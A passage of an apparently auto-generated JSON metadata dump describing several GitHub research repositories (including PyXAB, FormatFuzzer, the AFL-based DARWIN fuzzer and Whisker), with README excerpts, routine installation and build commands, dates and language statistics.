src=\"https://img.shields.io/github/forks/WilliamLwj/PyXAB?\" alt=\"github-PyXAB forks\"/>\n</a>\n<a href=\"https://github.com/WilliamLwj/PyXAB/stargazers\" target=\"blank\">\n<img src=\"https://img.shields.io/github/stars/WilliamLwj/PyXAB?\" alt=\"github-PyXAB stars\"/>\n</a>\n<a href=\"https://pepy.tech/project/pyxab\" target=\"blank\">\n<img src=\"https://static.pepy.tech/badge/pyxab\" alt=\"downloads\"/>\n</a>\n<a href=\"https://github.com/WilliamLwj/PyXAB/blob/main/LICENSE\" target=\"blank\">\n<img src=\"https://img.shields.io/github/license/WilliamLwj/PyXAB?color=purple\" alt=\"github-PyXAB license\" />\n</a>\n<a href=\"https://github.com/psf/black\" target=\"blank\">\n<img src=\"https://img.shields.io/badge/code%20style-black-000000.svg\" alt=\"Code style: black\" />\n</a>\n</p> \n\n<p align='center'>\n  <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/HCT_trajectory.gif\" alt=\"trajectory\" width=\"48%\"/>  \n  <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/HCT_heatmap.gif\" alt=\"heatmap\" width=\"48%\"/>  \n</p> \n",
                    "original_header": "PyXAB - Python *X*-Armed Bandit"
                },
                "confidence": 0.9999999179341397,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Objectives <img width=200/>| Image | \n| --- |--- |\n| [Garland](https://github.com/WilliamLwj/PyXAB/blob/main/PyXAB/synthetic_obj/Garland.py) | <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/synthetic/Garland.png\" alt=\"Garland\" width=\"100\"/> |\n| [DoubleSine](https://github.com/WilliamLwj/PyXAB/blob/main/PyXAB/synthetic_obj/DoubleSine.py)  | <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/synthetic/DoubleSine.png\" alt=\"DoubleSine\" width=\"100\"/>  |\n| [DifficultFunc](https://github.com/WilliamLwj/PyXAB/blob/main/PyXAB/synthetic_obj/DifficultFunc.py) | <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/synthetic/DifficultFunc.png\" alt=\"DifficultFunc\" width=\"100\"/>  |\n| [Ackley](https://github.com/WilliamLwj/PyXAB/blob/main/PyXAB/synthetic_obj/Ackley.py) | <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/synthetic/Ackley.png\" alt=\"Ackley\" width=\"100\"/>  |\n| [Himmelblau](https://github.com/WilliamLwj/PyXAB/blob/main/PyXAB/synthetic_obj/Himmelblau.py) | <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/synthetic/Himmelblau.png\" alt=\"Himmelblau\" width=\"100\"/>  |\n| [Rastrigin](https://github.com/WilliamLwj/PyXAB/blob/main/PyXAB/synthetic_obj/Rastrigin.py) |  <img src=\"https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/figs/synthetic/Rastrigin.png\" alt=\"Rastrigin\" width=\"100\"/>  | \n",
                    "original_header": "Synthetic objectives"
                },
                "confidence": 0.9999999999777742,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-16T19:21:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T07:07:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 198522
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "18": {
        "filename": "uds-se_FormatFuzzer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/uds-se/FormatFuzzer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\nsudo apt install git g++ make automake python3-pip zlib1g-dev libboost1.71-dev\npip3 install py010parser six intervaltree\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Requirements on Linux (Debian Packages)",
                    "parent_header": [
                        "FormatFuzzer",
                        "Prerequisites"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "value": "```\nxcode-select --install\nbrew install python3 automake boost\npip3 install py010parser six intervaltree\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Requirements on MacOS (with Xcode &amp; Homebrew)",
                    "parent_header": [
                        "FormatFuzzer",
                        "Prerequisites"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "value": "On all systems, using `pip`:\n```\npip install py010parser\npip install six\npip install intervaltree\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Python Packages Only (All Operating Systems)",
                    "parent_header": [
                        "FormatFuzzer",
                        "Prerequisites"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "value": "If the above `make` method does not work, or if you want more control, you may have to proceed manually.\n",
                    "type": "Text_excerpt",
                    "original_header": "Method 3: Manual steps",
                    "parent_header": [
                        "FormatFuzzer",
                        "Building"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "value": "Run the `ffcompile` compiler to compile the binary template into C++ code. It takes two arguments: the `.bt` binary template, and a `.cpp` C++ file to be generated.\n```\n./ffcompile templates/gif.bt gif.cpp\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 1: Compiling Binary Template Files into C++ code",
                    "parent_header": [
                        "FormatFuzzer",
                        "Building",
                        "Method 3: Manual steps"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "value": "Use the following commands to create a fuzzer `gif-fuzzer`.\nFirst, compile the generic command-line driver:\n\n```\ng++ -c -I . -std=c++17 -g -O3 -Wall fuzzer.cpp\n```\n(`-I .` denotes the location of the `bt.h` file; `-std=c++17` sets the C++ standard.)\n\nThen, compile the binary parser/compiler:\n\n```\ng++ -c -I . -std=c++17 -g -O3 -Wall gif.cpp\n```\n\nFinally, link the binary parser/compiler with the command-line driver to obtain an executable. If you use any extra libraries (such as `-lz`), be sure to specify these here too.\n```\ng++ -O3 gif.o fuzzer.o -o gif-fuzzer -lz\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Step 2: Compiling the C++ code",
                    "parent_header": [
                        "FormatFuzzer",
                        "Building",
                        "Method 3: Manual steps"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Note: all building commands require you to be in the same folder as this `README` file. Building a fuzzer outside of this folder is not yet supported.\n \n",
                    "original_header": "Building"
                },
                "confidence": 0.996621661612245,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "There's a `build.sh` script which automates all construction steps.\nSimply run\n```\n./build.sh gif\n```\nto create a GIF fuzzer. \nThis works for all file formats provided in `templates/`; if there is a file `templates/FOO.bt`, then `./build.sh FOO` will build a fuzzer. \n",
                    "original_header": "Method 1: Using the build.sh script"
                },
                "confidence": 0.9940856493583853,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "There's a `Makefile` (source in `Makefile.am`) which automates all construction steps.\n(Requires `GNU make`.)\nFirst do\n```\ntouch configure Makefile.in\n```\nthen\nBASH2*\nand then\nBASH3*\nto create a GIF fuzzer. \n",
                    "original_header": "Method 2: Using Make"
                },
                "confidence": 0.9808698679011718,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In addition to the format-specific fuzzers, such as `gif-fuzzer`, FormatFuzzer can also be compiled into format-specific shared libraries, such as `gif.so` (for that, simply run `./build.sh gif` or `make gif.so`).\nThose shared libraries can be loaded by general-purpose fuzzers, such as [AFL++](https://github.com/AFLplusplus/AFLplusplus). \nTo run AFL++ with FormatFuzzer, just follow the instructions on [our modified version of AFL++](https://github.com/uds-se/AFLplusplus).\nWe support different fuzzing strategies, including: \n",
                    "original_header": "AFL++ Integration"
                },
                "confidence": 0.9692254062438235,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you have created a `gif-fuzzer`, either by running `make gif-fuzzer` or by using the `ffcompile` tool, you have already obtained a C++ file `gif.cpp` which contains an implementation of the GIF generator and parser. This is useful to see how the changes you make to the binary template are translated into executable code. More details on the C++ code are presented on the next section. \n",
                    "original_header": "Creating and Customizing Binary Templates"
                },
                "confidence": 0.999702534310247,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uds-se/FormatFuzzer/master/README"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-07T15:45:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-15T12:35:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 537659
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 288788
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 47796
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 26782
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "M4",
                    "name": "M4",
                    "type": "Programming_language",
                    "size": 21282
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "19": {
        "filename": "bhpachulski_ICPC-RENE-Paper_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bhpachulski/ICPC-RENE-Paper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[cc-by-sa]: http://creativecommons.org/licenses/by-sa/4.0/\n[cc-by-sa-image]: https://licensebuttons.net/l/by-sa/4.0/88x31.png\n[cc-by-sa-shield]: https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg \n",
                    "original_header": "Abstract"
                },
                "confidence": 0.9913883948134029,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bhpachulski/ICPC-RENE-Paper/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-17T00:52:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-08-19T12:31:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 263468
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10913
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "20": {
        "filename": "codereef-ai_client_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/codereef-ai/client",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# CodeReef client installation\n\nYou can install the CodeReef client (CodeReef SDK) on most platforms using PIP as follows:\n\n```\npip install codereef\n```\n\nYou can also install the CodeReef client using a specific Python version (for example, Python 3.6):\n```\npython3.6 -m pip install codereef\n```\n\n*You may need to add flag \"--user\" to install the client in the user space:*\n```\npip install codereef --user\npython3.6 -m pip install codereef --user\n```\n\nYou should now be able to run this client using one of the following alternative commands:\n```\ncr\n\ncodereef\n\npython3.6 -m codereef\n```\n\nIf the installation is successful, you will see the list of all [available commands](../guide/commands).\n\n## Prerequisites\n\nThe CodeReef client requires minimal dependencies: Python 2.7+ or 3.x, PIP and Git. \n\n### Linux\n\nYou need to have the following packages installed (Ubuntu example):\n\n```\nsudo apt-get install python3 python3-pip git wget\n```\n\n### MacOS\n\n```\nbrew install python3 python3-pip git wget\n```\n\n### Windows\n\n* Download and install Git from [git-for-windows.github.io](https://git-for-windows.github.io).\n* Download and install any Python from [www.python.org/downloads/windows](https://www.python.org/downloads/windows).\n\n### Android (Linux host)\n\nThese dependencies are needed to cross-compile for Android (tested on Ubuntu 18.04 including Docker and Windows 10 Subsystem for Linux). \n\n```\n sudo apt update\n sudo apt install git wget libz-dev curl cmake\n sudo apt install gcc g++ autoconf autogen libtool\n sudo apt install android-sdk\n sudo apt install google-android-ndk-installer\n```\n\n### Docker\n\nWe prepared several Docker images with CodeReef at [CodeReef Docker hub](https://hub.docker.com/u/codereef).\nSelect the most relevant image and run it as follows:\n```\ndocker run -p 4444:4444 -it codereef/demo-obj-detection-mlperf-coco-tf-cpu-benchmark-linux-portable-workflows /bin/bash\n```\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/codereef-ai/client/master/docs/getting-started/installation.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Linux/MacOS: [![Build Status](https://travis-ci.org/codereef-ai/client.svg?branch=master)](https://travis-ci.org/codereef-ai/client)\nWindows: [![Windows Build status](https://ci.appveyor.com/api/projects/status/ef98qw1e16ql0sy9?svg=true)](https://ci.appveyor.com/project/gfursin/client) \n|               | As a host platform | As a target platform |\n|---------------|:------------------:|:--------------------:|\n| Generic Linux | \u2713 | \u2713 |\n| Linux (Arm)   | \u2713 | \u2713 |\n| Raspberry Pi  | \u2713 | \u2713 |\n| MacOS         | \u2713 | \u2713 |\n| Windows       | \u2713 | \u2713 |\n| iOS           | TBD | TBD |\n| Android       | prototyping | \u2713 | \n"
                },
                "confidence": 0.9961188776941872,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/codereef-ai/client/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-12-13T15:37:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-21T01:44:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 152581
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "21": {
        "filename": "mdrafiqulrabin_handcrafted-embeddings_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mdrafiqulrabin/handcrafted-embeddings",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Download source code/binaries of [SVMlight](http://svmlight.joachims.org/).\n- Run [data_light.py](https://github.com/mdrafiqulrabin/handcrafted-embeddings/blob/master/svm-handcrafted/data_light.py) to dump SVMlight format file.\n- Run [model_light.py](https://github.com/mdrafiqulrabin/handcrafted-embeddings/blob/master/svm-handcrafted/model_light.py) to train and evaluate SVMlight models. \n",
                    "original_header": "SVM-Handcrafted:"
                },
                "confidence": 0.9897872799898159,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mdrafiqulrabin/handcrafted-embeddings/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-12T10:28:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-18T04:03:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 180972
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 114602
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 70321
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2607
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "22": {
        "filename": "TUDA-SSL_DARWIN_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TUDA-SSL/DARWIN",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Fuzzing is one of the most powerful and proven strategies for identifying\nsecurity issues in real-world software; it is responsible for the vast\nmajority of remote code execution and privilege escalation bugs found to date\nin security-critical software.\n\nUnfortunately, fuzzing is also relatively shallow; blind, random mutations\nmake it very unlikely to reach certain code paths in the tested code, leaving\nsome vulnerabilities firmly outside the reach of this technique.\n\nThere have been numerous attempts to solve this problem. One of the early\napproaches - pioneered by Tavis Ormandy - is corpus distillation. The method\nrelies on coverage signals to select a subset of interesting seeds from a\nmassive, high-quality corpus of candidate files, and then fuzz them by\ntraditional means. The approach works exceptionally well, but requires such\na corpus to be readily available. In addition, block coverage measurements\nprovide only a very simplistic understanding of program state, and are less\nuseful for guiding the fuzzing effort in the long haul.\n\nOther, more sophisticated research has focused on techniques such as program\nflow analysis (\"concolic execution\"), symbolic execution, or static analysis.\nAll these methods are extremely promising in experimental settings, but tend\nto suffer from reliability and performance problems in practical uses - and\ncurrently do not offer a viable alternative to \"dumb\" fuzzing techniques.\n",
                    "type": "Text_excerpt",
                    "original_header": "1) Challenges of guided fuzzing",
                    "parent_header": [
                        "AFL-DARWIN"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TUDA-SSL/DARWIN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "QEMU is a project separate from AFL, but you can conveniently build the\nfeature by doing:\n```shell\n$ cd qemu_mode\n$ ./build_qemu_support.sh\n```\n \nFor additional instructions and caveats, see qemu_mode/README.qemu. \n",
                    "original_header": "4) Instrumenting binary-only apps"
                },
                "confidence": 0.9684912244989674,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TUDA-SSL/DARWIN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For target binaries that accept input directly from stdin, the usual syntax is:\n```shell\n$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]\n```\nFor programs that take input from a file, use '@@' to mark the location in\nthe target's command line where the input file name should be placed. The\nfuzzer will substitute this for you:\n```shell\n$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@\n```\n \nNon-instrumented binaries can be fuzzed in the QEMU mode (add -Q in the command\nline) or in a traditional, blind-fuzzer mode (specify -n). \n",
                    "original_header": "6) Fuzzing binaries"
                },
                "confidence": 0.9462770414664652,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TUDA-SSL/DARWIN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Any existing output directory can be also used to resume aborted jobs; try:\n```shell\n$ ./afl-fuzz -i- -o existing_output_dir [...etc...]\n```\n \n",
                    "original_header": "7) Interpreting output"
                },
                "confidence": 0.9904847286681899,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TUDA-SSL/DARWIN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    A good way to monitor disk I/O on Linux is the 'iostat' command:\n```shell\n    $ iostat -d 3 -x -k [...optional disk ID...]\n```\n \n",
                    "original_header": "12) Common-sense risks"
                },
                "confidence": 0.970108544452328,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TUDA-SSL/DARWIN/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  - AFL detects faults by checking for the first spawned process dying due to\n    a signal (SIGSEGV, SIGABRT, etc). Programs that install custom handlers for\n    these signals may need to have the relevant code commented out. In the same\n    vein, faults in child processed spawned by the fuzzed target may evade\n    detection unless you manually add some code to catch that. \n  - AFL doesn't output human-readable coverage data. If you want to monitor\n    coverage, use afl-cov from Michael Rash: https://github.com/mrash/afl-cov \n  - Occasionally, sentient machines rise against their creators. If this\n    happens to you, please consult http://lcamtuf.coredump.cx/prep/. \nBeyond this, see INSTALL for platform-specific tips.\n \n",
                    "original_header": "13) Known limitations &amp; areas for improvement"
                },
                "confidence": 0.9705633430854549,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TUDA-SSL/DARWIN/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-19T06:46:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-03T01:45:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 431312
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 35071
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 14175
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 5249
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "23": {
        "filename": "se2p_whisker_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/whisker",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Whisker requires Node.js v18.18.0 and is built using the [yarn](https://classic.yarnpkg.com/lang/en/) (classic) package manager. \nAfter cloning the repository, install all dependencies using:\n```bash\nyarn install\n```\n \nNow you can build the application using:\n```bash\nyarn build\n```\n \n",
                    "original_header": "Building Whisker"
                },
                "confidence": 0.9995904037989227,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/whisker/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Alternatively, you can build and run Whisker in headless mode using docker. This can be beneficial if you want to\nconduct large-scale experiments on a computing cluster. To this, create a Docker image for Whisker, for example using\nthe command\n```bash\ndocker build -t whisker .\n```\nNow, you can run the dockerized version of Whisker via\nBASH2*\nThe main entry point to the container is the wrapper script `whisker-docker.sh`, which calls Whisker's servant in\nheadless mode (using the flags `-d`, `-k` and `-l`, among others.) Any `<additional arguments>` given by the user will\nbe forwarded by the script to the servant. \nIn case you want to copy the artefacts created by Whisker (including redirection of stdout and stderr) to files in a\nwritable bind mount, you can achieve this for example as follows:\n```bash\ndocker run -v \"/on/the/host:/inside/the/container\" whisker /inside/the/container -- <Whikser arguments>\n```\nThis will mount the directory `/on/the/host` as `/inside/the/container`, instruct Whisker to copy its output (such as\ngenerated test files and log messages) to files in `/inside/the/container`, and make them accessible to you in the\ndirectory `/on/the/host`.\n \n",
                    "original_header": "Using Docker (Headless Mode)"
                },
                "confidence": 0.9947230544509869,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/whisker/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-24T15:20:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-17T04:19:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 1526083
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 636026
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 102585
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 32342
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 6900
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5369
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "24": {
        "filename": "Spirals-Team_casper_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Spirals-Team/casper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The evaluation dataset is at <https://github.com/Spirals-Team/npe-dataset/> \n",
                    "original_header": "Casper"
                },
                "confidence": 0.9197187953627927,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/casper/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-09-09T15:18:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-05T09:37:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 158266
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 194
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "25": {
        "filename": "NetManAIOps_DejaVu_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NetManAIOps/DejaVu",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. All the software requirements are already pre-installed in the Docker image below. The requirements are also listed in `requirements.txt` and `requirements-dev.txt`. Note that `DGL 0.8` is not released yet when I did this work, so I installed `DGL 0.8` manually from the source code. PyTorch version should be equal to or greater than 1.11.0.\n   ```bash\n   docker pull lizytalk/dejavu\n   ```\n2. Pull the code from GitHub\n   ```bash\n   git pull https://github.com/NetManAIOps/DejaVu.git DejaVu\n   ```\n3. Download the datasets following the link in the GitHub repo and extract the datasets into `./DejaVu/data`\n4. I use the command `realpath` in the example commands below, which is not bundled in macOS and Windows. On macOS, you can install it by `brew install coreutils`.\n5. Start a Docker container with our image and enter its shell\n   ```bash\n   docker run -it --rm -v $(realpath DejaVu):/workspace lizytalk/dejavu bash\n   ```\n6. Run `direnv allow` in the shell of the Docker container to set the environment variables.\n7. Run experiments in the shell of the Docker container following the usage table as follows.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "DejaVu",
                        "Code"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NetManAIOps/DejaVu/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
